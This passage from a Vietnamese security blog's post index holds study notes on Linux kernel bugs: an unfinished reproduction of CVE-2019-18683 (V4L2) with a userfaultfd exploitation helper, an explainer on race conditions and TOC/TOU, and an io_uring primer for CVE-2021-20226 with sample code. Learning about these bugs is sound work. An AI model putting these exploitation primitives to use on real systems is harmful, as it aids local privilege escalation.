kernel/exit.c. Thao tác này nhằm tránh trường hợp kthread hiện tại không dừng, nó sẽ làm kernel crash - chúng ta không muốn điều đó. Một số ảnh hưởng tới việc khai thác Có mốt số tính năng của kernel có thể ảnh hưởng tới việc khai thác của chúng ta:\nThiết lập /proc/sys/vm/unprivileged_userfaultfd vê 0 sẽ không cho phép payload được lưu trong kernel. Việc này gây ra hạn chế, userfaultfd() chỉ hoạt động bởi privileged users (với SYS_CAP_PTRACE capability). Thiết lập kernel.dmesg_restrict sysctl về 1 sẽ chặn rò rỉ thông tin qua kernel log. VIệc này hạn chế người dùng đọc thông tin từ kerbel syslog qua dmesg. Tuy nhiên, dù cho kernel.dmesg_restrict = 1. Người dùng Ubuntu từ group adm vẫn có thể đọc kernel log từ /var/log/syslog. Bản vá của grsecurity/PaX có một tính năng gọi là PAX_RANDKSTACK làm khó khăn cho việc đoán vị trí của vb2_qeue. PAX_RAP từ bản vá của grsecurity/PaX có thể chặn ROP/JOP chain mô tả ở trên. poc detail Tiếp theo chúng ta tiến hành viết poc để khai thác lỗi trên\nMôi trường thực thi qemu ubuntu server 18.04.3 How To Install \u0026ldquo;linux-tools-virtual-lts-vivid\u0026rdquo; Package on Ubuntu Trong quá trình cài đặt và kiểm tra với lệnh getfacl /dev/video0 có thể bạn sẽ bị lỗi vì thiêu thư mục dev/video0. Bài viết này giúp tôi giải quyết được vấn đề này. Cài đặt KASAN để debug Init and start setxattr_userfaltfd_monitor, adjtimex_userfaultfd_monitor Chúng ta tiến hành tạo và chạy setxattr_userfaultfd và adjtimex_userfaultfd để giám sát và xử lí lỗi pagefault 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 void init_setxattr_userfaultfd(){ long uffd; /* userfaultfd file descriptor */ /* start of region handled by userfaultfd */ unsigned long len; /* Length of region handled by userfaultfd */ pthread_t thr; /* ID of thread taht handles pagefaults */ struct uffdio_api uffdio_api; struct uffdio_register uffdio_register; int s; printf(\u0026#34;[+] init_setxattr_userfaultfd\\n\u0026#34;); page_size = sysconf(_SC_PAGE_SIZE); printf(\u0026#34;[*] pagesize = %lf\\n\u0026#34;, page_size); pthread_t thr2[100] = { 0 }; len = 4 * page_size; /* Create and enable userfaultfd object */ uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); if (uffd == -1) err_exit(\u0026#34;userfaultfd\u0026#34;); uffdio_api.api = UFFD_API; uffdio_api.features = 0; if (ioctl(uffd, UFFDIO_API, \u0026amp;uffdio_api) == -1) err_exit(\u0026#34;ioctl-UFFDIO_API\u0026#34;); /* Create a private anonymous mapping. The memory will be demand-zero paged--that is, not yet allocated. When we actually touch the memory, it will be allocated via the userfaultfd. */ xattr_addr = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf(\u0026#34;[+] The sexattr_addr anonymous page_addr: %p\\n\u0026#34;, xattr_addr); if (xattr_addr == MAP_FAILED) err_exit(\u0026#34;mmap\u0026#34;); uffdio_register.range.start = (unsigned long)xattr_addr + 2 * page_size; uffdio_register.range.len = 2*page_size; uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING; if (ioctl(uffd, UFFDIO_REGISTER, \u0026amp;uffdio_register) == -1) err_exit(\u0026#34;ioctl-UFFDIO_REGISTER\u0026#34;); /* Create a thread that will process the userfaultfd events */ s = pthread_create(\u0026amp;thr, NULL, fault_handler_thread, (void*)uffd); if (s != 0){ errno = s; err_exit(\u0026#34;pthread_create\u0026#34;); } } Trong hàm này, tôi chú ý tới một số điểm - những điểm này đối với tôi ở thời điểm hiện tại đọc không hiểu / chưa hiểu rõ:\nHàm sysconf(_SC_PAGE_SIZE): Nguồn tham khảo https://www.programmersought.com/article/80733633259/ https://zoomadmin.com/HowToInstall/UbuntuPackage/linux-tools-virtual-lts-vivid https://www.anquanke.com/post/id/200029 ","description":"Khai thác lỗ hổng nhân Linux trong hệ thống con V4L2 (chưa xong)","id":6,"section":"posts","tags":["cve, linux kernel, V4l2"],"title":"Tìm hiểu về CVE-2019-18683","uri":"https://minhlongmt183.github.io/posts/cve-2019-18683/"},{"content":"\rBài viết này nhằm mục đích ghi lại những kiến thức đã học để nhớ và hiểu rõ hơn. Bài viết tham khảo chủ yếu từ Winning the race: Signals, symlinks, and TOC/TOU\rGiới thiệu Không phải tất cả race condition đều là lỗ hổng, những phần lớn các race condition sẽ dẫn tới lỗ hổng ở một nơi nào đó. Nói cách khác, những lỗ hổng hình thành do race condition thường là những lỗ hổng cực kì nghiêm trọng. Trong lập trình đa luồng, race conditions không phải là việc xuất hiện vấn đề và ta khai thác, nó chỉ là việc luồng thực thi không giống như chúng ta kì vọng. Bugs có thể tồn tại ở mọi nơi, từ những ứng dụng Linux ở cấp thấp cho đến triển khai DBMS quan hệ đa luồng. Race conditions là gì? Hãy tưởng tượng bạn đang tham gia cuộc thi chạy điền kinh và đối thủ của bạn lại là chị Nguyễn Thi Thúy Hiền. Vì đã rất nỗ lực, bạn và chị Hiền ngang tài ngang sức và cũng bước vào giai đoạn nước rút về đích. Thật bất ngờ, cả 2 cùng chạm đích cùng một lúc, hệ thống cho thấy cả 2 chạm vạch đích cùng thời điểm đến hàng nano giây. Nếu chỉ chọn 1 quán quân vậy ai sẽ là quán quân? Bạn ? Hay chị Hiền? Hay cả 2 (việc này sẽ làm giảm giá trị của chức quán quân)? Hay chẳng ai cả? tổ chức thi đấu lại? Mọi khả năng đều có thể xảy ra và chẳng ai biết khả năng nào sẽ xảy ra. Race condition trong trường hợp này cũng tương tự như vậy. Race conditions là một chủ đề cực kì lớn, với nhiều hàm ý bảo mật khác nhau, từ hành vi không dự đoán trước được, không có vẻ nguy hiểm gì cho đến sự cố máy chủ, chiếm quyền điều khiển bằng thực thi dòng lệnh từ xa. Nó bắt nguồn từ việc lập trình viên giả sử chương trình của mình đang chạy tuyến tính hoặc đang chạy song song nhưng không xem xét triệt để, an toàn. Chương trình của họ có thể hoàn hảo khi chạy 1 hoạt động (operation), những khi chạy 2 hay nhiều operations trên nhiều process khác nhau, nó có thể dẫn tới luồng thực thi bị thay đổi, dẫn tới kết quả không mong muốn đối với victim (hoặc mong muốn - đối với attacker). Race conditons không phải luôn là lỗ hổng bảo mật vì một số trường hợp, những hành vi không mong muốn được phát sinh này không mang lại nguy hiểm nào đối với hệ thống cả. Race conditons có thể xuất hiện ở nhiều ngữ cảnh, thậm chí tồn tại ngay trong những thiết bị điện tử cơ bản (cả điện sinh học. Race condtions đã tìm thấy bên trong não của chuột sống). Tiền đề cơ bản cho race conditions là 2 thread chống lại nhau để tìm người thắng cuộc. Người thắng có quyền thao túng luồng thực thi của ứng dụng. 1 2 3 4 5 6 7 8 9 10 11 12 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;signal.h\u0026gt; // keep an eye out for this header especially #include \u0026lt;race_conditon.h\u0026gt; int main(void){ if (something == permitted){ doThis(); } else { printf(\u0026#34;lolnope\\n\u0026#34;); } } Thông thường, race conditons có xu hướng xuất hiện trong những ứng dụng viết bằng C. Đặc biệt trong những chương trình có sử dụng thư viện signal.h vì header này xuất hiện dự báo rằng chương trình sẽ có những race tìm ẩn để dẫn tới số lượng tín hiệu xử lí là ít nhất. Mặt khác, nếu kiểm tra quyền của các tệp có xuất hiện các symlink races cũng cho thấy có nguy cơ về race condition. Đoạn code trên chỉ là mã giả, nó sẽ không chạy, mục đích của đoạn mã giả nhằm giúp chúng ta có cái nhìn trực quan hơn về kiểu tấn công dựa trên race condition. Gỉa sử attacker gửi hai operations tới chương trình tại cùng thời điểm, cùng 1 trạng thái trên luồng mã thực thi (nếu được). Nếu như thời gian chính xác, attacker có thể cho phép một biến nào đó đúng / hoặc sai tại một thời điểm kiểm tra, nhưng biến này không còn được sử dụng tại thời điểm đó. (Này được gọi là TOC/TOU race có nghĩa là Time of Check, Time of Use)\nGiả sử, chúng ta thực hiện lệnh 1 if (something_is_permitted) // check if permitted Nếu điều kiện đúng thì nó sẽ thực thi doThis() giống như kì vọng của tác giả, tuy nhiên nếu somethig_is_not_permitted mà hàm if này vẫn chấp nhận thì khi thực hiện doThis() sẽ có nguy cơ phát sinh những trường hợp không mong muốn, và tuy theo mã sau đó thế nào mà attacker có thể bypass access controls, escalate privileges, cause a denial of service\nKhi nói về Race Conditions, mọi người thường nghĩ tới những thứ gì đó rất nhanh, thời gian phải cực kì chính xác để có thể thực thi TOC/TOU race. Điều này không sai, tuy nhiên không phải lúc nào cũng vậy. Cùng xem xét ví dụ về lỗi `slow-paced\u0026quot; race condition: Có một ứng dụng mạng xã hội, người dừng có thể sử đổi thông tin của họ. Một user click vào nút \u0026ldquo;edit profile\u0026rdquo;, ứng dụng mở ra một trang web cho phép họ thực hiện sửa đổi. User tiến hành sử đổi bằng bàn phím (go AFK - Away from Keyboard). Quản trị viên nhìn thấy những lỗi không mong muốn trong chức năng sửa đổi thông tin trên website, nên quyết định tắt chức năng này. Do đó, user không thể dùng nó để sửa thông tin của họ. Quay lại với user trên, anh ta vẫn còn đang ở trong trang web cho việc sửa đổi thông tin. Mặc dù new user không thể truy cập vào trang \u0026ldquo;edit profile\u0026rdquo;, nhưng user này vẫn còn trang web cho việc sửa đổi thông tin nên anh ta vẫn có thể tiếp tục sửa đổi, mặc dù chức năng này đã bị quản trị viên tắt. Race conditons có thể được gây ra do độ trễ trong networks. Giả sử có một hub và 2 linked nodes. Bob muốn đăng kí một channel #hax và Alice cũng muosn đăng kí cùng chanel này. Xem xét trường hợp sau: Bob kết nối tới IRC từ node #1 Alice kết nối tới IRC từ node #2 Bob chạy /join #hax Alice chạy /join #hax Cả hai câu lệnh đều được thực hiện từu 2 node khác nhau, cùng 1 thời điểm. Bob trở thành người điều hành của #hax. Alic trở thành người điều hành của #hax. Nguyên nhân cho trường hợp này bởi vì độ trễ mạng, node #1 sẽ có thời gian gửi tín hiệu tới node #2 để cảnh báo rằng Services Daemon đã bị người khác nắm giữ trên cùng network. (PROTIP: When testing local desktop applications for Race Conditions - for example a compiled binary - use something like GDB or OllyDBG to set a breakpoint between TOC and TOU within the source code of the binary you are debugging. Execute your code from the breakpoint and take note of the results in order to determine any potential security risk or lack thereof. This is for confirmation of the bug only, and not for actual exploitation. As the saying goes, PoC||GTFO. This rings especially true with race conditions considering some of them are just bugs or glitches or whatever you wanna call them, as opposed to viable exploits with real attack value. If you cannot demonstrate impact, you probably should not report it)\r","description":"Trong quá trình reproduce CVE-2019-18683, tôi nhận ra hiểu biết của mình về race condtion quá ít và hạn hẹp, bài viết này với mục đích note lại những kiến thức liên quan về race condtion","id":7,"section":"posts","tags":["cve, linux kernel, race condition"],"title":"Wining the racing","uri":"https://minhlongmt183.github.io/posts/wining_the_racing/"},{"content":"\rBài viết này nhằm mục đích ghi lại những kiến thức đã học để nhớ và hiểu rõ hơn. Bài viết tham khảo chủ yếu từ CVE-2021–20226 a reference counting bug which leads to local privilege escalation in io_uring.\rĐôi nét về io_uring io_uring Asynchronous I/O (AIO) framework là một giao diện I/O mới cho Linux, được giới thiệu trên linux kernel version 5.1 (tháng 3 - 2019).\nCommunication channel From: https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a\nio_uring instance có 2 vòng, submission queue (SQ) và completion queue (CQ) được chia sẻ giữa kernel và ứng dụng. Những hàng đợi: single producer, single consumer cung cấp 1 giao diện ít khóa, và được phối hợp với rào cản bộ nhớ (memory barrier). Application sẽ tạo một hoặc nhiều SQ entry (SQE) và sẽ cập nhật vào đuôi của hàng đợi SQ. Kernel cũng sử dụng SQE, nó sẽ cập nhật vào đầu của hàng đợi SQ. Kernel sẽ tạo một hoặc nhiều CQ entry (CQE) và sẽ cập nhật vào đuôi của hàng đợi CQ. Application cũng sử dụng thằng CQE này và cập nhật từ đầu của hàng đợi CQ. Systemcall API io_uring API gồm 3 system call chính bao gồm: io_uring_setup, io_uring_register, io_uring_enter\nio_uring_setup Thiết lập một ngữ cảnh để thực hiện chạy IO bất đồng bộ.\n1 int io_uring_setup(u32 entries, struct io_uring_params *p); Lệnh này sẽ tiến hành thiết lập 2 hàng đợi submission queue và completion queue với số lượng các phần tử entries ít nhất. Trả về một file description để thực hiện các hoạt động tiếp theo trên phiên bản io_uring. 2 hàng đợi này được chia sẻ giữa kernel và application, giúp giảm chi phí khi dữ liệu giao tiếp giữa 2 bên (ko cần phải sao chép) khi khởi tạo và thực thi I/O.\nNhững tham số được sử dụng bởi application để cấu hình cho io_uring instance và kernel sẽ trả lại thông tin về cấu hình đến 2 hàng vòng buffer.\nio_uring instance có thể được cấu hình ở 3 chế độ hoạt động chính:\nInterrupt driven Mặc định, io_uring instance sẽ được thiết lập để điều khiển IO khi lỗi, IO có thể được gửi bằng io_uring_enter() và được lấy trực tiếp từ completion queue. Polled: thực hiện chế độ chờ I/O hoàn thành. File hệ thống và những thiết bị khối (block device) cần phải được hỗ trợ mới sử dụng tính năng này. Tính năng này giúp giảm thiểu độ trễ khi thực hiện IO, tuy nhiên nó lại tốn nhiều resource của CPU hơn việc thực hiện Interrupt. Hiện nay, tính năng này chỉ thực hiện với những file descriptor được mở kèm với cờ O_DIRECT.\nKhi đọc hoặc viết vào ngữ cảnh đã thiết lập poll thì ứng dụng phải tiến hành xem tình trạng hoàn thành trên CQ ring bằng lệnh io_uring_enter(). Việc trộn và kết hợp I / O đã được thăm dò và không được thăm dò trên một phiên bản io_uring là ko được phép. Kernel polled: Trong chế độ này, kernel thread được tạo để thăm dò hàng đợi gửi (submission queue). Một io_uring instanceđược cấu hình theo cách này cho phép ứng dụng xử lí I/O mà không cần xuống kernel. Bằng việc dùng submisstion queue để điền những SQE mới và kiểm tra tình trạng hoàn thành trên completion queue, ứng dụng có thể submit và lấy kết quả I/O mà không cần thực hiện system call.\nTrường hợp kernel rảnh rỗi hơn tổng thời gian người dùng cấu hình, nó sẽ tiếp tục nhàn rỗi đến khi nhận được thông báo từ ứng dụng. Trong trường hợp này, ứng dụng gọi lệnh io_uring_enter() để tiến hành đánh thức kernel.\nio_uring_setup() sẽ trả về một fd (file descripton), giá trị này được sử dụng cho mmap để tạo 2 hàng đợi SQ và CQ, và có thể được sử dụng bởi 2 system call io_uring_register() và io_uring_enter() io_uring_register Những file được đăng kí hoặc user buffer chạy IO bất đồng bộ.\n1 int io_uring_register(unsigned int fd, unsigned int opcode, void *arg, unsigned int nr_args); Được sử dụng cho thực thể io_uring được trỏ bởi fd. Việc đăng kí này giúp kernel thread\ncó thời gian tham chiếu tới cấu trúc dữ liệu bên trong kernel liên kết với tệp lâu hơn, hoặc tạo ánh xạ của từng vùng nhớ cụ thể trên ứng dụng với buffer lâu hơn. Chúng ta chỉ cần đăng kí 1 lần thay vì phải thực hiện nhiều lần trong quá trình xử lí, việc này giúp giảm overhead trên IO trong xử lí. Những buffer được đăng kí sẽ bị khóa trên memory và sẽ bị \u0026ldquo;tính phí\u0026rdquo; theo giới hạn RLIMIT_MEMLOCK của người dùng. Thường giới hạn này sẽ là 1GB/buffer. Hiện tại, bộ nhớ đệm phải ẩn danh (ANONYMOUS) và không được sao lưu bằng tệp. Có thể thiết lập 1 vùng đệm lớn rồi chọn 1 phần nhỏ cho I/O, miễn phần nhỏ đó nằm trong vùng được ánh xạ. Ứng dụng có thể tăng, giảm kích thước hoặc số lượng buffer đã đăng kí bằng cách hủy đăng kí buffer hiện tại và đăng kí buffer mới với lệnh io_uring_register(). Một ứng dụng có thể cập nhật động tập các file đã đăng kí mà không cần hủy đăng kí chúng. Có thể sử dụng eventfd để nhận thông báo về các sự kiện hoàn thành trên phiên bản io_uring. Nếu đạt được, một eventfd file descriptor có thể được đăng kí thông qua system call này. Thông tin đăng nhập của ứng dụng đang chạy có thể được đăng kí với io_uring, nó sẽ trả về một id liên kết với các thông tin đã đăng nhập đó. Các ứng dụng muốn chia sẻ vòng kết nối giữa những người dùng / quy trình riêng biệt có thể chuyển vào id thông tin xác thực này trong trường tính cách SQE. Nếu được đặt, SQE cụ thể đó sẽ được cấp với các thông tin xác thực này. io_uring_enter Khởi tạo và hoàn thành I/O bất đồng bộ\nio_uring_enter() dùng để khởi tạo và hoàn thành I/O\tsử dụng hàng đợi submission và completion được thiết lập bởi io_uring_setup(). Một lệnh gọi đơn sẽ bao gồm gửi một I/O mới và đợi phản hồi của lệnh gọi này hoặc tất cả các lệnh gọi trước đó đến io_uring_enter(). 1 2 int io_uring_enter(unsigned int fd, unsigned int to_submit, unsigned int min_complete, unsigned int flags, sigset_t *sig); Trong đó:\nfd file descriptor được return bởi io_uring_setup() to_submit chỉ định số lượng I/O để submit từ submission queue. Nếu được chỉ dẫn nhưu vậy, hệ thống sẽ đợi hoàn thành sự kiện min_complete trước khi quay trở lại. Nếu thực thể io_uring được cấu hình để thăm dò, thì min_complete sẽ có ý nghĩa khác một chút. min_complete: như ở trên đã nói, ngoài ra, nếu nó bằng 0 ý nói kernel sẽ trả về bất kì sự kiện nào đã được hoàn thành mà không bị chặn. Nếu khác 0, kernel chỉ trả về lập tức sự kiện đang hoàn thành. Nếu không có sự kiện hoàn thành nào khả dụng, thì cuộc gọi sẽ thăm dò ý kiến ​​cho đến khi có một hoặc nhiều sự kiện hoàn thành hoặc cho đến khi quá trình vượt quá phần thời gian của bộ lập lịch của nó. Lưu ý rằng đối với I / O được điều khiển gián đoạn, một ứng dụng có thể kiểm tra hàng đợi hoàn thành để biết sự kiện hoàn thành mà không cần nhập hạt nhân. io_uring_enter() hỗ trợ nhiều phép toán, bao gồm: Open, close, and stat files Read and write into multiple buffers or pre-mapped buffers Socket I/O operations Synchronize file state Giám sát bất đồng bộ một tập file descriptors Tạo timeout liên kết tới hoạt động cụ thể trong vòng Cố gắng hủy một hoạt động hiện đang bay (thực hiện) Tạo I/O chains Thực hiện theo thứ tự trong một chuỗi Thực thi song song cho nhiều chuỗi Cơ chế hoạt động Asynchronous execution Không phải lúc nào io_uring cũng chạy bất đồng bộ mà nó chỉ chạy khi nó cần. Nguyên nhân là để giảm thiểu tối đa việc gọi io_uring_enter() system call để tăng hiệu suất của chương trình.\nVí dụ ở đoạn code dưới đây (Kernel 5.8)\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 #define _GNU_SOURCE #include \u0026lt;sched.h\u0026gt; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;signal.h\u0026gt; #include \u0026lt;sys/syscall.h\u0026gt; #include \u0026lt;sys/fcntl.h\u0026gt; #include \u0026lt;err.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; #include \u0026lt;linux/io_uring.h\u0026gt; #define SYSCHK(x) ({ \\ typeof(x) __res = (x); \\ if (__res == (typeof(x))-1) \\ err(1, \u0026#34;SYSCHK(\u0026#34; #x \u0026#34;)\u0026#34;); \\ __res; \\ }) static int uring_fd; struct iovec *io; #define SIZE 32 char _buf[SIZE]; int main(void) { // initialize uring struct io_uring_params params = { }; uring_fd = SYSCHK(syscall(__NR_io_uring_setup, /*entries=*/10, \u0026amp;params)); unsigned char *sq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING)); unsigned char *cq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING)); struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES)); io = malloc(sizeof(struct iovec)*1); io[0].iov_base = _buf; io[0].iov_len = SIZE; struct timespec ts = { .tv_sec = 1 }; sqes[0] = (struct io_uring_sqe) { .opcode = IORING_OP_TIMEOUT, //.flags = IOSQE_IO_HARDLINK, .len = 1, .addr = (unsigned long)\u0026amp;ts }; sqes[1] = (struct io_uring_sqe) { .opcode = IORING_OP_READV, .addr = io, .flags = 0, .len = 1, .off = 0, .fd = SYSCHK(open(\u0026#34;/etc/passwd\u0026#34;, O_RDONLY)) }; ((int*)(sq_ring + params.sq_off.array))[0] = 0; ((int*)(sq_ring + params.sq_off.array))[1] = 1; (*(int*)(sq_ring + params.sq_off.tail)) += 2; int submitted = SYSCHK(syscall(__NR_io_uring_enter, uring_fd, /*to_submit=*/2, /*min_complete=*/0, /*flags=*/0, /*sig=*/NULL, /*sigsz=*/0)); while(1){ usleep(100000); if(*_buf){ puts(\u0026#34;READV executed.\u0026#34;); break; } puts(\u0026#34;Waiting.\u0026#34;); } } Cùng nhìn lại cơ chế làm việc của io_uring\nFrom: https://flattsecurity.medium.com/cve-2021-20226-a-reference-counting-bug-which-leads-to-local-privilege-escalation-in-io-uring-e946bd69177a\nChúng ta có một cấu trúc iovec ở line 21 để định nghĩa một phần tử vector 1 2 3 4 struct iovec{ ptr_t iov_base; /* Starting address */ size_t iov_len; /* Length in bytes */ }; Thông thường cấu trúc này được sử dụng như một mảng gồm nhiều phần tử. Mỗi lần chuyển đổi dữ liệu, con trỏ iov_base sẽ trỏ vào vùng đệm để nhận dữ liệu (với lệnh readv) hoặc chuyển dữ liệu (với lệnh writev). Còn phần tử iov_len định nghĩa độ dài tối đa được nhận và được viết trong mỗi lần thực thi. Đoạn code từ line 40-42 để cấp phát cũng như định nghĩa giá trị các phần tử iov_base và iov_len.\nCấu trúc io_uring_params ở line 29 dùng để chuyển các tùy chọn đến kernel và từ kernel truyền thông tin về bộ đệm vòng (ring buffer) 1 2 3 4 5 6 7 8 9 10 11 struct io_uring_params { __u32 sq_entries; __u32 cq_entries; __u32 flags; __u32 sq_thread_cpu; __u32 sq_thread_idle; __u32 features; __u32 resv[4]; struct io_sqring_offsets sq_off; struct io_cqring_offsets cq_off; }; Code từ line 29-39 dùng để tạo 2 vòng đêm buffer cho SQ và CQ cùng với 1 buffer SQEs để lưu các Submission Entries. Cấu trúc timespec ở line 44dùng để đặc tả thời gian ở dạng seconds và nanoseconds: 1 2 3 4 5 6 #include \u0026lt;time.h\u0026gt; struct timespec { time_t tv_sec; long tv_nsec; } Ở đây, nó được tạo với 1 sec.\nCấu trúc io_uring_sqe ở line 37, 46, 52 diễn tả cấu trúc của submission queue entry 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 struct io_uring_sqe { __u8 opcode; /* type of operation for this sqe */ __u8 flags; /* IOSQE_ flags */ __u16 ioprio; /* ioprio for the request */ __s32 fd; /* file descriptor to do IO on */ __u64 off; /* offset into file */ __u64 addr; /* pointer to buffer or iovecs */ __u32 len; /* buffer size or number of iovecs */ union { __kernel_rwf_t rw_flags; __u32 fsync_flags; __u16 poll_events; __u32 sync_range_flags; __u32 msg_flags; }; __u64 user_data; /* data to be passed back at completion time */ union { __u16 buf_index; /* index into fixed buffers, if used */ __u64 __pad2[3]; }; }; Trong đó:\nopcode: để đặc tả hoạt động. Ví dụ: readv dùng hằng số IORING_OP_READV fd: file descriptor của file muốn đọc addr: được dùng để trỏ đến một mảng các iovec. len: giữ giá trị độ dài của mảng các iovec Do đó, đoạn code từ line 52-59 khai báo sử dụng lệnh readv trên file /etc/passwd. Còn từ line 44-51 có sử dụng hằng số IORING_OP_TIMEOUT để chỉ định rằng khi ứng dụng đang sleep thì hoạt động này sẽ được thực hiện.\nCả đoạn code trên, khi thực thi, cứ sau 0.1 seconds sẽ kiểm tra xem liệu readv() đã thực thi xong hay chưa. Và vì ts ta thiết lập nó 1 seconds và truyền vào sqes[0] nên readv() thực thi (sqes[1] thực thi) sẽ sau 1 second. Tuy nhiên, khi thực thi, ta thấy readv() lại thực thi ngay\n1 2 3 4 root@edisc:/home/test# ./sample READV executed root@edisc:/home/test# ./sample READV executed Điều này chứng tỏ, hệ thống không chạy bất đồng bộ, hay nói cách khác, nó chỉ chạy khi nó cần thiết, và trường hợp này là không cần thiết, hoạt động của IORING_OP_TIMEOUT đã bị bỏ qua.\nTa sẽ kiểm tra trong trường hợp chương trình sample chạy bất đồng bộ bằng tool systemtap\nTheo tác giả thì khi thêm flag IORING_OP_HARDLINK thì chương trình sample.c sẽ tiến hành kiếm tra sau 0.1s in ra dòng chữ waiting và sau 1s lệnh READV sẽ được thực thi, và sẽ in ra READV executed. Tuy nhiên trong quá trình kiểm tra trên ubuntu 20.04, kernel 5.8.0-59-generic thì lại nhận được thông báo IORING_OP_HARDLINK chưa được khai báo. Trong khi IORING_OP_LINK vẫn bình thường.\nMột chút về IOSQE_IO_HARDLINK và IOSQE_IO_LINK Ở trên ta có đề cập tới 2 flag IOSQE_IO_HARDLINK và IOSQE_IO_LINK, ta sẽ tìm hiểu nó là gì.\nIOSQE_IO_LINK: cờ này để chỉ định các SQE được chạy trong hàng đợi sẽ phụ thuộc lẫn nhau, phần tử sau đợi phần tử ở trước, giống như trong 1 gia đình, ông bố phải sinh ra rồi thằng con mới được sinh, nếu ông bố sinh thất bại thì thằng con, cháu và cả dòng họ sau này cũng sẽ ra đi theo ông bố. Độ dài của chuỗi sẽ tùy ý, tự mở rộng nếu có thêm SQE vào. IOSQE_IO_HARDLINK: giống như link nhưng nó mạnh hơn. Một số lệnh bị kết thúc do gặp phải lỗi, lúc này kết quả trả về sẽ \u0026lt; 0. Ví dụ, timeout sẽ không có bộ đếm số lần thực hiện, nó sẽ luôn hoàn thành với -ETIME trừ khi nó bị hủy. Do đó, nếu dùng cờ IOSQE_IO_LINK khi 1 SQE trả về giá trị nhỏ hơn 0, nó sẽ cắt đứt toàn bộ chuỗi phía sau. Trường hợp chúng ta có dùng lệnh và biết chắc nó sẽ xảy ra lỗi, khi đó, IOSQE_IO_HARDLINK sẽ làm liên kết mạnh hơn mà không bị cắt đứt bởi kết quả trả về ở SQE trước đó. Chú ý rằng liên kết vẫn sẽ bị ngắt nếu lệnh trước đó không gửi và thực hiện được, các liên kết chỉ được phục hồi khi yêu cầu trước đó nhận được phản hồi. Ta có thể thấy, nguyên lí hoạt động của việc quyết định một tác vụ có chạy được bất đồng bộ hay không như sau:\nTrong ảnh trên, ta thấy mà process bị chặn lại thì nó sẽ chuyển đến IORING_OP_TIMEOUT và từ đây nó sẽ được chuyển sang kernel thread. Như đã đề cập trước đó, API này nó chỉ chạy bất đồng bộ khi cần nghĩa là sẽ có một số điều kiện nào đó để nó chạy bất đồng bộ. Ví dụ một số trường hợp sau.\nKhi bật cờ yêu cầu buộc phải chạy bất đồng bộ REQ_F_FORCE_ASYNC 1 2 3 4 5 6 7 8 9 } else if (req-\u0026gt;flags \u0026amp; REQ_F_FORCE_ASYNC) { ...... /* * Never try inline submit of IOSQE_ASYNC is set, go straight * to async execution. */ req-\u0026gt;work.flags |= IO_WQ_WORK_CONCURRENT; io_queue_async_work(req); } code here\nDo logic của từng hoạt động riêng, ví dụ như thêm flag IOCB_NOWAIT khi gọi readv() và trả về EAGAIN khi muốn dừng. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 static int io_read(struct io_kiocb *req, struct io_kiocb **nxt, bool force_nonblock) { ...... ret = rw_verify_area(READ, req-\u0026gt;file, \u0026amp;kiocb-\u0026gt;ki_pos, iov_count); if (!ret) { ssize_t ret2; if (req-\u0026gt;file-\u0026gt;f_op-\u0026gt;read_iter) ret2 = call_read_iter(req-\u0026gt;file, kiocb, \u0026amp;iter); else ret2 = loop_rw_iter(READ, req-\u0026gt;file, kiocb, \u0026amp;iter); /* Catch -EAGAIN return for forced non-blocking submission */ if (!force_nonblock || ret2 != -EAGAIN) { kiocb_done(kiocb, ret2, nxt, req-\u0026gt;in_async); } else { copy_iov: ret = io_setup_async_rw(req, io_size, iovec, inline_vecs, \u0026amp;iter); if (ret) goto out_free; return -EAGAIN; } } ...... } code here\nỞ đây có cấu trúc io_kiocb phục vụ cho việc đọc file\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /* * NOTE! Each of the iocb union members has the file pointer * as the first entry in their struct definition. So you can * access the file pointer through any of the sub-structs, * or directly as just \u0026#39;ki_filp\u0026#39; in this struct. */ struct io_kiocb { union { struct file\t*file; struct io_rw\trw; struct io_poll_iocb\tpoll; struct io_poll_update\tpoll_update; struct io_accept\taccept; struct io_sync\tsync; struct io_cancel\tcancel; struct io_timeout\ttimeout; struct io_timeout_rem\ttimeout_rem; struct io_connect\tconnect; struct io_sr_msg\tsr_msg; struct io_open\topen; struct io_close\tclose; struct io_rsrc_update\trsrc_update; struct io_fadvise\tfadvise; struct io_madvise\tmadvise; struct io_epoll\tepoll; struct io_splice\tsplice; struct io_provide_buf\tpbuf; struct io_statx\tstatx; struct io_shutdown\tshutdown; struct io_rename\trename; struct io_unlink\tunlink; /* use only after cleaning per-op data, see io_clean_op() */ struct io_completion\tcompl; }; Khi giá trị EAGAIN được trả về, process sẽ được đưa vào hàng đợi để chạy bất đồng bộ line 9-23:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 static void __io_queue_sqe(struct io_kiocb *req, const struct io_uring_sqe *sqe) { ...... ret = io_issue_sqe(req, sqe, \u0026amp;nxt, true); /* * We async punt it if the file wasn\u0026#39;t marked NOWAIT, or if the file * doesn\u0026#39;t 